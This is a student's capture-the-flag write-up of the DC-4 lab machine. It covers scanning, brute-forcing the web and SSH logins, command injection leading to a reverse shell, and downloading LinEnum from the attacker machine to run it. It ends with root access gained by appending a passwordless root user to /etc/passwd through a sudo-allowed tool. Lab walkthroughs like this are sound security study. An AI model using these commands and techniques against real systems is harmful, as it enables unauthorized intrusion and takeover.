# Report DC-4

## Credit

- **Maxime GILLEN**
  - **Mail:** [maxime.gillen@edu.fr](mailto:maxime.gillen@edu.ece.fr)

## Nmap Scan

> The IP address of the target is **10.0.2.4**

### Command

```bash
nmap -sS -A 10.0.2.4 -oN nmapReport.txt
```

### Nmap Report

```bash
Nmap scan report for 10.0.2.4
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
| 2048 8d6057066c27e02f762ce642c001ba25 (RSA)
| 256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)
|\_ 256 fd39478a5e58339973739e227f904f4b (ED25519)
80/tcp open http nginx 1.15.10
|\_http-server-header: nginx/1.15.10
|\_http-title: System Tools
MAC Address: 08:00:27:E3:7E:DC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT ADDRESS
1 1.84 ms 10.0.2.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

## Work on port 80

We will use **Burp** to BruteForce the login page.

### BruteForce

Firstly we suppose than the login is **admin** and we will use the wordlist given in the subject to find the password.

For the password **happy** we have a different response length than the others, so we can suppose that it's the good one.

> So we can try to login with the credentials **admin:happy** and we have a successfull login.

## Find a way to get a shell

When we are logged in, we can see that we are on the page **/command.php**. By using for example the repeater of Burp, we can see that the page is vulnerable to **Command Injection**.

### Command Injection

The goal is to obtain the list of users on the server. To do it we have 2 methods:

- **Method 1**: We can use the command **cat /etc/passwd** to get the list of users.
- **Method 2**: We can find a way to get a reverse shell.

### Method 1

- We can use the command **ls /home** to get the list of users.

### Method 2

- We have to find a php vulnerability to get a reverse shell. To do it we just have to understand how the command is executed. To do it we just have to cat the file **command.php**.

- And we can see than commands use the function : **php shell exec**

- We can generate a reverse shell [on this website](https://www.revshells.com/) for example.

- Now we just have to add a listener on our machine with the command : `nc -nlvp [The Port than we want listen]`

- And we can send the reverse shell with Burp.

- And we have a shell.

- `cat /etc/passwd` to get the list of users. And we can see that we have 3 users **charles**, **jim** and **sam**.

## Find a clue to establish a ssh connection

By examining the home directory of the user **jim** we can see that we backup directory and inside we have a file which contain a list of potential passwords.

### Usage of Hydra to crack the password

> We can use Hydra to crack the password.

### Command

```bash
hydra -l jim -P wodlistjim.txt -t 4  10.0.2.4  ssh -V
```

### Hydra Report

```bash
[22][ssh] host: 10.0.2.4   login: jim   password: jibril04
```

> So we can try to login with the credentials **jim:jibril04** and we have a successfull login.

## Find a way to escalate privileges

### Connect to the server with ssh

### Command

```bash
ssh jim@10.0.2.4 -p 22
```

> We successfully connect to the server with the user **jim**.

### Find a way to escalate privileges

### LinEnum

We can use LinEnum to find a way to escalate privileges.

### Command on Kali Linux to send LinEnum

```bash
python3 -m http.server 80
```

### Command on the server to get LinEnum

> Good Pratice: Use wget to get the file inside the /tmp directory.

```bash
wget http://[IP of Kali]:80/LinEnum.sh
```

### Command to execute LinEnum

```bash
chmod +x LinEnum.sh // To make the file executable
./LinEnum.sh // To execute the file
```

/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc

cat /var/mail/jim

Charles password
^xHhA&hvim0y

### Charle report LinEnum

```bash
[+] We can sudo without supplying a password!
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

## Use the function teehee to escalate privileges

By analyzing what the function teehee do, we can see that we can append commands into a file as root.
So the main goal is to append a new user as root into the file **/etc/passwd**.

### Command

```bash
cat /etc/passwd
```

### Result

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

So we can append a new user as root into the file **/etc/passwd**. To do it we can use the command **teehee** as sudo but we have to be carreful than we respect the syntax of the root user : `root:x:0:0:root:/root:/bin/bash`

### Command

```bash
echo "eagles::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

So now we added a new user named eagles as root.

### Command to connect as eagles

```bash
su eagles
```

> We successfully are root of the machine.

### Command to get the flag

```bash
cd /root
cat flag.txt

```

### Result

```
888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  "Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

```
